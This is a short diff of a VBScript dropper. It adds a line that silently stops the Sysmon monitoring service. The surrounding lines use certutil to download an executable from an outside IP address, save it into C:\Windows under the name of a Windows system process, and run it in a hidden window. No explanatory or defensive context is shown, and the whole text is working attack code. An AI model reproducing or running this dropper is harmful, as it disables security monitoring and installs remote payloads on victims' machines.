@@ -8,6 +8,7 @@
 	const impersonation = 3
         const HIDDEN_WINDOW = 12
         Set Locator = CreateObject("WScript.Shell")
+	Locator.Run"sc stop Sysmon ",0,TRUE
 	Locator.Run"certutil -urlcache -split -f http://10.14.83.23/sihost.exe c:\Windows\sihost.exe",0,TRUE
 	Locator.Run"c:\Windows\sihost.exe",0,FALSE
 	Set Locator = Nothing
